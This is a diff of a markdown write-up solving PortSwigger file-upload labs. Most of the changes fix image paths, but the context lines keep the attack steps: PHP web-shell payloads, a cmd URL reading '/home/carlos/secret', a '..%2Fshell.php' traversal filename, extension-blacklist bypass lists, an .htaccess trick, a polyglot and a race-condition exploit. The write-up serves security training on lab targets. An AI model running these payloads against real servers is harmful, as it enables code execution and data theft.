@@ -6,13 +6,13 @@ tags:
   - File-upload-vulnerabilities
   - Burpsuite
   - Caido
-image: cover.png
+image: images/cover.png
 category: PortsWigger Labs Writeups
 draft: false
 ---
 # File upload vulnerabilities
 
-![Pasted image 20251113005655.png](images/Pasted image 20251113005655.png)
+![Pasted image 20251113005655.png](images/Pasted_image_20251113005655.png)
 
 - File upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size.
 - Failing to properly enforce restrictions on these could mean that even a basic image upload function can be used to upload arbitrary and potentially dangerous files instead.
@@ -21,13 +21,13 @@ draft: false
 - Other attacks may involve a follow-up HTTP request for the file, typically to trigger its execution by the server.
 ## Lab 1: Remote code execution via web shell upload
 
-![Pasted image 20251112232056.png](images/Pasted image 20251112232056.png)
+![Pasted image 20251112232056.png](images/Pasted_image_20251112232056.png)
 
 
 - To avail the upload functionality we have to log in using given creds `wiener:peter`,
 - Here we can see avatar upload appears and we just have to upload basic `php webshell` and get the `secret from carlos user`.
 
-![Pasted image 20251112232310.png](images/Pasted image 20251112232310.png)
+![Pasted image 20251112232310.png](images/Pasted_image_20251112232310.png)
 
 - So tried to upload this basic PHP shell which uses `SYSTEM` to execute commands, and capture that req,
 
@@ -45,7 +45,7 @@ draft: false
 </html>
 ```
 
-![Pasted image 20251112232532.png](images/Pasted image 20251112232532.png)
+![Pasted image 20251112232532.png](images/Pasted_image_20251112232532.png)
 
 ```http
 POST /my-account/avatar HTTP/1.1
@@ -102,7 +102,7 @@ nlhQonXV4LBKhQxttXGS50odez98jR3T
 https://0aeb00e4030de4cc8158ed55003c00de.web-security academy.net/files/avatars/shell.php?cmd=id
 ```
 
-![Pasted image 20251112233221.png](images/Pasted image 20251112233221.png)
+![Pasted image 20251112233221.png](images/Pasted_image_20251112233221.png)
 
 - I tried to run `id` and it worked so now we can grep `secret` and submit and by submitting it we will solve the lab,
 - This is particular URL with parameters, 
@@ -111,8 +111,8 @@ https://0aeb00e4030de4cc8158ed55003c00de.web-security academy.net/files/avatars/
 https://0aeb00e4030de4cc8158ed55003c00de.web-security-academy.net/files/avatars/shell.php?cmd=cat%20/home/carlos/secret
 ```
 
-![Pasted image 20251112233325.png](images/Pasted image 20251112233325.png)
-![Pasted image 20251112233352.png](images/Pasted image 20251112233352.png)
+![Pasted image 20251112233325.png](images/Pasted_image_20251112233325.png)
+![Pasted image 20251112233352.png](images/Pasted_image_20251112233352.png)
 
 >[!hint]
 >This is basically chaining of vulnerability like we have `file upload vulnerability` and we use it to upload shell and get `RCE vulnerability`.
@@ -120,13 +120,13 @@ https://0aeb00e4030de4cc8158ed55003c00de.web-security-academy.net/files/avatars/
 
 ## Lab 2: Web shell upload via Content-Type restriction bypass
 
-![Pasted image 20251112233537.png](images/Pasted image 20251112233537.png)
+![Pasted image 20251112233537.png](images/Pasted_image_20251112233537.png)
 
  - To avail the upload functionality we have to log in using given creds `wiener:peter`,
  - Here we can see avatar upload appears and we just have to upload basic `php webshell` and get the `secret from carlos user`.
  - one catch is that there is `content-type` restriction which prevent users to upload any unexpected file but it is user-controllable so we can bypass it.
 
-![Pasted image 20251112233816.png](images/Pasted image 20251112233816.png)
+![Pasted image 20251112233816.png](images/Pasted_image_20251112233816.png)
 
 ```http
 POST /my-account/avatar HTTP/1.1
@@ -177,7 +177,7 @@ tF3ThN8bOP8Fnzsz4HfOaCP6K04TcHwi
 ------WebKitFormBoundaryH8ycy7YePiWBIJlF--
 ```
 
-![Pasted image 20251112233918.png](images/Pasted image 20251112233918.png)
+![Pasted image 20251112233918.png](images/Pasted_image_20251112233918.png)
 
 - This gives me error, ==Sorry, file type application/octet-stream is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.==
 - So maybe we can change `content-type` to png and it bypass the restriction and upload it, and it works perfectly.
@@ -187,24 +187,24 @@ tF3ThN8bOP8Fnzsz4HfOaCP6K04TcHwi
 <?php echo file_get_contents('/home/carlos/secret'); ?>
 ```
 
-![Pasted image 20251112235251.png](images/Pasted image 20251112235251.png)
+![Pasted image 20251112235251.png](images/Pasted_image_20251112235251.png)
 
 ```http
 https://0aca00a50467484a866109f400ec00aa.web-security-academy.net/files/avatars/shell.php
 ```
 
-![Pasted image 20251112235431.png](images/Pasted image 20251112235431.png)
+![Pasted image 20251112235431.png](images/Pasted_image_20251112235431.png)
 
-![Pasted image 20251112235447.png](images/Pasted image 20251112235447.png)
+![Pasted image 20251112235447.png](images/Pasted_image_20251112235447.png)
 
 ## Lab 3: Web shell upload via path traversal
 
-![Pasted image 20251112235556.png](images/Pasted image 20251112235556.png)
+![Pasted image 20251112235556.png](images/Pasted_image_20251112235556.png)
 
 - everything other things such as login and image upload functionality is same as previous lab,
 - But In this lab, we have to exploit `path traversal` vulnerability and by chaining it we have to execute out shell,
 
-![Pasted image 20251112235854.png](images/Pasted image 20251112235854.png)
+![Pasted image 20251112235854.png](images/Pasted_image_20251112235854.png)
 
 - If we upload same shell same as before it works but this just print the content of php,
 - here is the `shell.php`,
@@ -213,9 +213,9 @@ https://0aca00a50467484a866109f400ec00aa.web-security-academy.net/files/avatars/
 <?php echo file_get_contents('/home/carlos/secret'); ?>
 ```
 
-![Pasted image 20251113000023.png](images/Pasted image 20251113000023.png)
+![Pasted image 20251113000023.png](images/Pasted_image_20251113000023.png)
 
-![Pasted image 20251113000257.png](images/Pasted image 20251113000257.png)
+![Pasted image 20251113000257.png](images/Pasted_image_20251113000257.png)
 
 - So i tried to add `../` and i URL encode `/` it and then upload the shell and when i try to access `shell.php` it renders,
 - Here is why it doesn't works first case and works in second case,
@@ -239,21 +239,21 @@ Content-Disposition: form-data; name="avatar"; filename="..%2Fshell.php"
 Content-Type: application/octet-stream
 ```
 
-![Pasted image 20251113002309.png](images/Pasted image 20251113002309.png)
+![Pasted image 20251113002309.png](images/Pasted_image_20251113002309.png)
 
 - And now when we access the file we can see `secret`, and also we can see that file is in `/files` not in `/files/avatars` means `/avatars` is static directory.
 
-![Pasted image 20251113002339.png](images/Pasted image 20251113002339.png)
+![Pasted image 20251113002339.png](images/Pasted_image_20251113002339.png)
 
-![Pasted image 20251113002808.png](images/Pasted image 20251113002808.png)
+![Pasted image 20251113002808.png](images/Pasted_image_20251113002808.png)
 ## Lab 4: Web shell upload via extension blacklist bypass 
 
-![Pasted image 20251113002907.png](images/Pasted image 20251113002907.png)
+![Pasted image 20251113002907.png](images/Pasted_image_20251113002907.png)
 
 - There will some `blacklisting` defense in this lab so we have to bypass that using different techniques,
 - Same as previous lab we have to login using given creds, 
 
-![Pasted image 20251113003108.png](images/Pasted image 20251113003108.png)
+![Pasted image 20251113003108.png](images/Pasted_image_20251113003108.png)
 
 - Now we capture upload req, and as expected it give `403` on shell upload,
 
@@ -302,7 +302,7 @@ Jjk83eNf6hSjXTWkM7e0IC7wTd8TtuGd
 <?php echo file_get_contents('/home/carlos/secret'); ?>
 ```
 
-![Pasted image 20251113003200.png](images/Pasted image 20251113003200.png)
+![Pasted image 20251113003200.png](images/Pasted_image_20251113003200.png)
 
 - So now we have to brute force the `.php` extension and try those which can bypass blacklist,
 - This is are some of them,
@@ -316,7 +316,7 @@ Jjk83eNf6hSjXTWkM7e0IC7wTd8TtuGd
 .phtml
 ```
 
-![Pasted image 20251113004056.png](images/Pasted image 20251113004056.png)
+![Pasted image 20251113004056.png](images/Pasted_image_20251113004056.png)
 
 - This many are works perfectly and we got `200` on it,
 
@@ -327,12 +327,12 @@ Jjk83eNf6hSjXTWkM7e0IC7wTd8TtuGd
 .php7
 ```
 
-![Pasted image 20251113004138.png](images/Pasted image 20251113004138.png)
+![Pasted image 20251113004138.png](images/Pasted_image_20251113004138.png)
 
 - when i tried to access one of these it again don't render and show me plaintext so i tried previous trick `%2F` but not worked,
 - Because maybe this is properly sanitized that you can't do `path traversal` so even if i upload php shell i can't able to execute it. 
 
-![Pasted image 20251113005417.png](images/Pasted image 20251113005417.png)
+![Pasted image 20251113005417.png](images/Pasted_image_20251113005417.png)
 
 - So i tried another technique which is uploading `.htaccess` file with our own definition of another custom extension with its `content-type`,
 
@@ -380,11 +380,11 @@ Jjk83eNf6hSjXTWkM7e0IC7wTd8TtuGd
 ------WebKitFormBoundaryDM4TB2X7iyGMaA2B--
 ```
 
-![Pasted image 20251113005220.png](images/Pasted image 20251113005220.png)
+![Pasted image 20251113005220.png](images/Pasted_image_20251113005220.png)
 
 - Now tried to upload `shell.php` by changing `.php` to `l33t` and it successfully take it,
 
-![Pasted image 20251113005135.png](images/Pasted image 20251113005135.png)
+![Pasted image 20251113005135.png](images/Pasted_image_20251113005135.png)
 
 - And when we accessed it, it rendered perfectly,
 
@@ -392,21 +392,21 @@ Jjk83eNf6hSjXTWkM7e0IC7wTd8TtuGd
 https://0adb00c904b6a72282c9515400e900f3.web-security-academy.net/files/avatars/shell.l33t
 ```
 
-![Pasted image 20251113004918.png](images/Pasted image 20251113004918.png)
+![Pasted image 20251113004918.png](images/Pasted_image_20251113004918.png)
 
-![Pasted image 20251113005105.png](images/Pasted image 20251113005105.png)
+![Pasted image 20251113005105.png](images/Pasted_image_20251113005105.png)
 
 ## Lab 5: Web shell upload via file extension
 
-![Pasted image 20251114152323.png](images/Pasted image 20251114152323.png)
+![Pasted image 20251114152323.png](images/Pasted_image_20251114152323.png)
 
 - We have to login using using given creds to avail upload functionality,
 
-![Pasted image 20251114152836.png](images/Pasted image 20251114152836.png)
+![Pasted image 20251114152836.png](images/Pasted_image_20251114152836.png)
 
 - In normal uploading `shell.php` it fails and throws `403 forbidden` error,
 
-![Pasted image 20251114153723.png](images/Pasted image 20251114153723.png)
+![Pasted image 20251114153723.png](images/Pasted_image_20251114153723.png)
 
 - First thing that comes in mind is that to try all `php` extensions with and without little obfuscation,
 - So for that i used this wordlist, [PHP Extensions List by PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst).
@@ -437,9 +437,9 @@ https://0adb00c904b6a72282c9515400e900f3.web-security-academy.net/files/avatars/
 .inc
 ```
 
-![Pasted image 20251114154932.png](images/Pasted image 20251114154932.png)
+![Pasted image 20251114154932.png](images/Pasted_image_20251114154932.png)
 
-![Pasted image 20251114155054.png](images/Pasted image 20251114155054.png)
+![Pasted image 20251114155054.png](images/Pasted_image_20251114155054.png)
 
 - This 4 succeed and got `200 OK` and file successfully uploaded,
 - What does this means,
@@ -452,44 +452,44 @@ https://0adb00c904b6a72282c9515400e900f3.web-security-academy.net/files/avatars/
 .php\x00.jpg
 ```
 
-![Pasted image 20251114155451.png](images/Pasted image 20251114155451.png)
+![Pasted image 20251114155451.png](images/Pasted_image_20251114155451.png)
 
 - When i tried to access the `shell.php` it executed and got the `secret` (Note: PHP shell is same as used previous) and by submitting this we solve the lab.
 
-![Pasted image 20251114154731.png](images/Pasted image 20251114154731.png)
+![Pasted image 20251114154731.png](images/Pasted_image_20251114154731.png)
 
-![Pasted image 20251114155623.png](images/Pasted image 20251114155623.png)
+![Pasted image 20251114155623.png](images/Pasted_image_20251114155623.png)
 
 ## Lab 6: Remote code execution via polyglot web shell upload
 
-![Pasted image 20251114160142.png](images/Pasted image 20251114160142.png)
+![Pasted image 20251114160142.png](images/Pasted_image_20251114160142.png)
 
 - We have to log in to your own account using the following credentials: `wiener:peter` to avail upload functionality,
 
-![Pasted image 20251114160428.png](images/Pasted image 20251114160428.png)
+![Pasted image 20251114160428.png](images/Pasted_image_20251114160428.png)
 
 - Again tried vanilla upload technique of `shell.php` but failed, 
 - So now we have to try something called `# polyglot web shell` which means a **single file that is valid in multiple formats at the same time**.
 - `GIF89a;` is nothing but GIF file signature or magic bytes.
 - ==Server checks files magic bytes and if it match with that GIF then allow it.==
 
-![Pasted image 20251114162128.png](images/Pasted image 20251114162128.png)
+![Pasted image 20251114162128.png](images/Pasted_image_20251114162128.png)
 
 - I tried and it works and file uploaded successfully, and submit the `secret` and solve the lab. 
 
-![Pasted image 20251114162318.png](images/Pasted image 20251114162318.png)
+![Pasted image 20251114162318.png](images/Pasted_image_20251114162318.png)
 
-![Pasted image 20251114162305.png](images/Pasted image 20251114162305.png)
+![Pasted image 20251114162305.png](images/Pasted_image_20251114162305.png)
 
-![Pasted image 20251114162549.png](images/Pasted image 20251114162549.png)
+![Pasted image 20251114162549.png](images/Pasted_image_20251114162549.png)
 
 ## Lab 7: Web shell upload via race condition
 
-![Pasted image 20251114164005.png](images/Pasted image 20251114164005.png)
+![Pasted image 20251114164005.png](images/Pasted_image_20251114164005.png)
 
 - We have to log in to my own account using the following credentials: `wiener:peter` to avail upload functionality.
 
-![Pasted image 20251114164157.png](images/Pasted image 20251114164157.png)
+![Pasted image 20251114164157.png](images/Pasted_image_20251114164157.png)
 
 - So in this lab, we to exploit race condition to upload web shell and this is the vulnerable code given in hint,
 - This is code tells that our uploaded file is first stored to `/avatars` and then `checkViruses()` and `checkFileType` function invokes and if it fails then file will be delete. 
@@ -603,6 +603,6 @@ while True:
 
 - And we successfully win the race condition and we got the `secret` and after submitting it we solve the lab
 
-![Pasted image 20251114165910.png](images/Pasted image 20251114165910.png)
+![Pasted image 20251114165910.png](images/Pasted_image_20251114165910.png)
 
-![Pasted image 20251114170001.png](images/Pasted image 20251114170001.png)
+![Pasted image 20251114170001.png](images/Pasted_image_20251114170001.png)
